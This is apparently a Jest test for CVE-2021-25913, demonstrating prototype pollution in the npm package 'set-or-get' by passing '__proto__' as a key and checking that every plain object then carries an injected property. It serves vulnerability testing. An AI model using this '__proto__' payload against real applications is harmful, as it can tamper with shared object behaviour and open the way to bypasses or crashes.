//https://www.whitesourcesoftware.com/vulnerability-database/CVE-2021-25913

test("prototype pollution in set-or-get", () => {
  var SetOrGet = require("set-or-get");
  obj = {};

  expect({}.polluted).toBe(undefined);

  SetOrGet(obj, "__proto__", {}).polluted = "yes";
  expect({}.polluted).toBe("yes");
});
